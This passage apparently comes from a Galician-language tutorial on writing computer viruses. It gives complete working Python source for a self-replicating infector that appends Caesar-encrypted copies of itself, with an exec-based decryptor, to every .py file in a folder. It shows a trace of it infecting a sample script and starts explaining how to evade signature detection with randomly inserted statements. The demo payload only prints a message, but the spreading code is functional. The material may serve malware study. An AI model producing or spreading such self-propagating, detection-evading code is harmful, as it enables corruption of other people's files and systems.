+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_descifrado
+</code></pre></div><ul>
+<li>Función <strong>cifra</strong>: esta función cifra un texto co cifrado Cesar.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cifra</span>(texto, clave):
+    texto_cifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_cifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_cifrado
+</code></pre></div><p>Nota: as funcións de cifrado e descifrado, só modificarán as maiúsculas e minúsculas. O resto de caracteres déixanos 
+igual.</p>
+<ul>
+<li>Función <strong>infectar</strong>: esta función busca no cartafol dende onde se executa o virus arquivos que teñan a extensión .py 
+para infectalos. Se existe algún arquivo que teña esta extensión, abrirase o arquivo e comprobarase se contén a cadea 
+de caracteres “del calcula_clave”, se non a ten, faranse as seguintes accións:
+<ul>
+<li>Cifraranse as funcións “cifra”, “infectar”, “payload” e “executa”.</li>
+<li>Engadiranse as funcións calcula_clave e descifra ao arquivo a infectar.</li>
+<li>Crearase un código para descifrar o texto cifrado.</li>
+<li>Engadiranse o código cifrado e o código para descifralo ao final do arquivo a infectar.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> texto_script:
+                parte_en_claro <span style="color:#f92672">=</span> virus[:<span style="color:#ae81ff">541</span>]
+                parte_a_cifrar <span style="color:#f92672">=</span> virus[<span style="color:#ae81ff">541</span>:]
+                clave <span style="color:#f92672">=</span> calcula_clave(texto_script)
+                parte_crifrada <span style="color:#f92672">=</span> cifra(parte_a_cifrar, clave)
+                script<span style="color:#f92672">.</span>write(parte_en_claro)
+                descrifrador <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_portador = portador.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;parte_sin_cifrar = texto_portador[texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+541]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clave = calcula_clave(texto_portador)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_descifrado = descifra(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> parte_crifrada <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, clave)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(texto_descifrado)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;executa(parte_sin_cifrar + texto_descifrado)&#34;</span>
+                script<span style="color:#f92672">.</span>write(descrifrador)
+            script<span style="color:#f92672">.</span>close()
+</code></pre></div><ul>
+<li>Código da variable <strong>descifrador</strong>: este é o código que se utiliza para descifrar o contido cifrado do virus despois 
+da primeira infección.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+parte_sin_cifrar <span style="color:#f92672">=</span> texto_portador[texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>):texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">541</span>]
+clave <span style="color:#f92672">=</span> calcula_clave(texto_portador)
+texto_descifrado <span style="color:#f92672">=</span> descifra(<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">wxy vbykt(mxqmh, vetox):
+</span><span style="color:#e6db74">    mxqmh_vbyktwh = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vtktvmxk bg mxqmh:
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">***
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy xqxvnmt(obknl):
+</span><span style="color:#e6db74">    bgyxvmtk(obknl)
+</span><span style="color:#e6db74">    itrehtw()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>, clave)
+<span style="color:#66d9ef">exec</span>(texto_descifrado)
+executa(parte_sin_cifrar <span style="color:#f92672">+</span> texto_descifrado)
+</code></pre></div><ul>
+<li>Función <strong>payload</strong>: esta función contería o código malicioso. Neste caso só imprime pola pantalla a mensaxe 
+“Fuches infectado”.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuches infectado&#34;</span>)
+</code></pre></div><ul>
+<li>Función <strong>executa</strong>: chama as funciona de infectar e payload.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executa</span>(virus):
+    infectar(virus)
+    payload()
+</code></pre></div><ul>
+<li><strong>Código global</strong>: Este código lee o código do xerme, quédase co resto coas funcións explicadas anteriormente e 
+executa o virus.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> texto_portador[:<span style="color:#ae81ff">2244</span>]
+executa(virus)
+</code></pre></div><p>Despois de explicar todas as funcións, o código completo do xerme é o seguinte:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_clave</span>(texto):
+    <span style="color:#66d9ef">if</span> len(texto) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        clave <span style="color:#f92672">=</span> ord(texto[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">descifra</span>(texto, clave):
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_descifrado
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cifra</span>(texto, clave):
+    texto_cifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_cifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">+</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_cifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_cifrado
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> texto_script:
+                parte_en_claro <span style="color:#f92672">=</span> virus[:<span style="color:#ae81ff">541</span>]
+                parte_a_cifrar <span style="color:#f92672">=</span> virus[<span style="color:#ae81ff">541</span>:]
+                clave <span style="color:#f92672">=</span> calcula_clave(texto_script)
+                parte_crifrada <span style="color:#f92672">=</span> cifra(parte_a_cifrar, clave)
+                script<span style="color:#f92672">.</span>write(parte_en_claro)
+                descrifrador <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_portador = portador.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;portador.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;parte_sin_cifrar = texto_portador[texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):texto_portador.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calcula_clave&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+541]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;clave = calcula_clave(texto_portador)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;texto_descifrado = descifra(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> parte_crifrada <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, clave)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(texto_descifrado)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;executa(parte_sin_cifrar + texto_descifrado)&#34;</span>
+                script<span style="color:#f92672">.</span>write(descrifrador)
+            script<span style="color:#f92672">.</span>close()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuches infectado&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executa</span>(virus):
+    infectar(virus)
+    payload()
+
+
+<span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> texto_portador[:<span style="color:#ae81ff">2244</span>]
+executa(virus)
+</code></pre></div><p>Se executamos este código nun cartafol con onde se atope algún outro ficheiro cuxa extensión é .py obterase a seguinte 
+traza:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus2$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">9</span> 15:59 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">21</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">9</span> 12:04 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">20</span> Dec  <span style="color:#ae81ff">9</span> 15:59 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2385</span> Dec  <span style="color:#ae81ff">9</span> 15:59 virus.py
+probasvx@probasvx:~/virus2$ cat Ola.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola mundo!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus2$ python3 virus.py 
+Fuches infectado
+probasvx@probasvx:~/virus2$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">9</span> 15:59 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">21</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">9</span> 12:04 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2628</span> Dec  <span style="color:#ae81ff">9</span> 16:00 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2385</span> Dec  <span style="color:#ae81ff">9</span> 15:59 virus.py
+</code></pre></div><p>Nesta traza pódese ver que o ficheiro Ola.py aumentou de tamaño. O contido que contén despois da execución do virus é o 
+seguinte:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Ola mundo!&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_clave</span>(texto):
+    <span style="color:#66d9ef">if</span> len(texto) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        clave <span style="color:#f92672">=</span> ord(texto[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">descifra</span>(texto, clave):
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> caracter<span style="color:#f92672">.</span>islower():
+            texto_descifrado <span style="color:#f92672">+=</span> chr((ord(caracter) <span style="color:#f92672">-</span> clave <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            texto_descifrado <span style="color:#f92672">+=</span> caracter
+    <span style="color:#66d9ef">return</span> texto_descifrado
+
+<span style="color:#f92672">import</span> sys
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+parte_sin_cifrar <span style="color:#f92672">=</span> texto_portador[texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>):texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calcula_clave&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">541</span>]
+clave <span style="color:#f92672">=</span> calcula_clave(texto_portador)
+texto_descifrado <span style="color:#f92672">=</span> descifra(<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">wxy vbykt(mxqmh, vetox):
+</span><span style="color:#e6db74">    mxqmh_vbyktwh = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vtktvmxk bg mxqmh:
+</span><span style="color:#e6db74">        by vtktvmxk.blniixk():
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 65) % 26 + 65)
+</span><span style="color:#e6db74">        xeby vtktvmxk.blehpxk():
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vak((hkw(vtktvmxk) + vetox - 97) % 26 + 97)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            mxqmh_vbyktwh += vtktvmxk
+</span><span style="color:#e6db74">    kxmnkg mxqmh_vbyktwh
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy bgyxvmtk(obknl):
+</span><span style="color:#e6db74">    bfihkm hl
+</span><span style="color:#e6db74">    yhk tkjnboh bg hl.eblmwbk(&#34;.&#34;):
+</span><span style="color:#e6db74">        by tkjnboh.xgwlpbma(&#34;.ir&#34;):
+</span><span style="color:#e6db74">            lvkbim = hixg(tkjnboh, &#34;k+&#34;)
+</span><span style="color:#e6db74">            mxqmh_lvkbim = lvkbim.kxtw()
+</span><span style="color:#e6db74">            by &#34;wxy vtevnet_vetox&#34; ghm bg mxqmh_lvkbim:
+</span><span style="color:#e6db74">                itkmx_xg_vetkh = obknl[:541]
+</span><span style="color:#e6db74">                itkmx_t_vbyktk = obknl[541:]
+</span><span style="color:#e6db74">                vetox = vtevnet_vetox(mxqmh_lvkbim)
+</span><span style="color:#e6db74">                itkmx_vkbyktwt = vbykt(itkmx_t_vbyktk, vetox)
+</span><span style="color:#e6db74">                lvkbim.pkbmx(itkmx_xg_vetkh)
+</span><span style="color:#e6db74">                wxlvkbyktwhk = &#34;bfihkm lrl&#34; + vak(10) + &#34;ihkmtwhk = hixg(lrl.tkzo[0], &#34; + vak(34) + &#34;k&#34; + vak(34) + &#34;)&#34; + vak(10) + &#34;mxqmh_ihkmtwhk = ihkmtwhk.kxtw()&#34; + vak(10) + &#34;ihkmtwhk.vehlx()&#34; + vak(10) + &#34;itkmx_lbg_vbyktk = mxqmh_ihkmtwhk[mxqmh_ihkmtwhk.ybgw(&#34; + vak(34) + &#34;wxy vtevnet_vetox&#34; + vak(34) + &#34;):mxqmh_ihkmtwhk.ybgw(&#34; + vak(34) + &#34;wxy vtevnet_vetox&#34; + vak(34) + &#34;)+541]&#34; + vak(10) + &#34;vetox = vtevnet_vetox(mxqmh_ihkmtwhk)&#34; + vak(10) + &#34;mxqmh_wxlvbyktwh = wxlvbykt(&#34; + vak(34) + vak(34) + vak(34) + itkmx_vkbyktwt + vak(34) + vak(34) + vak(34) + &#34;, vetox)&#34; + vak(10) + &#34;xqxv(mxqmh_wxlvbyktwh)&#34; + vak(10) + &#34;xqxvnmt(itkmx_lbg_vbyktk + mxqmh_wxlvbyktwh)&#34;
+</span><span style="color:#e6db74">                lvkbim.pkbmx(wxlvkbyktwhk)
+</span><span style="color:#e6db74">            lvkbim.vehlx()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy itrehtw():
+</span><span style="color:#e6db74">    ikbgm(&#34;Ynvaxl bgyxvmtwh&#34;)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy xqxvnmt(obknl):
+</span><span style="color:#e6db74">    bgyxvmtk(obknl)
+</span><span style="color:#e6db74">    itrehtw()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>, clave)
+<span style="color:#66d9ef">exec</span>(texto_descifrado)
+executa(parte_sin_cifrar <span style="color:#f92672">+</span> texto_descifrado)
+</code></pre></div><p>No ficheiro infectado pódense ver as seguintes partes:</p>
+<ul>
+<li>O código do anterior programa (o &ldquo;Ola mundo!&quot;).</li>
+<li>As funcións para o cálculo da clave e descifrado.</li>
+<li>O código cifrado xunto coas chamadas as funcións de cálculo da clave e descifrado.</li>
+<li>Chamada a función exec para que Python interprete o código descifrado.</li>
+</ul>
+<p>Despois de todos os cambios realizados ao virus inicial segue habendo unha debilidade, este virus pódese detectar polas 
+funcións de descifrado e cálculo de clave, xa que estas pódense utilizar como sinatura para a detección do virus.</p>
+<p>Hai que destacar que este virus infecta aos arquivos que non conteñan a cadea de caracteres “def calcula_clave”, polo 
+que se nun programa ou script lexítimo existe esa cadea de caracteres, non será infectado.</p>
+<h2 id="evitando-a-detección-por-firma">Evitando a detección por firma</h2>
+<p>Nesta nova versión, engadirase a funcionalidade de modificar o código das funcións que non se cifran (calcula_clave e 
+descifa) engadindo a palabra reservada “pass” varias veces de forma aleatoria neste código. Hai que dicir que a palabra 
+reservada “pass” non ten ningún efecto na funcionalidade das funcións. Cada vez que se execute o virus, os novos 
+arquivos infectados poderán ter os “pass” en diferentes posicións. Con esta modificación pretendese que non se utilice 
+o código que non se cifra como sinatura do virus.</p>
+<p>Para conseguir a funcionalidade descrita engadíronse e modificáronse as seguintes funcións:</p>
+<ul>
+<li>Función <strong>borra_pass</strong>: esta función borra todas as aparicións da palabra reservada “pass” no código que non se cifra.</li>
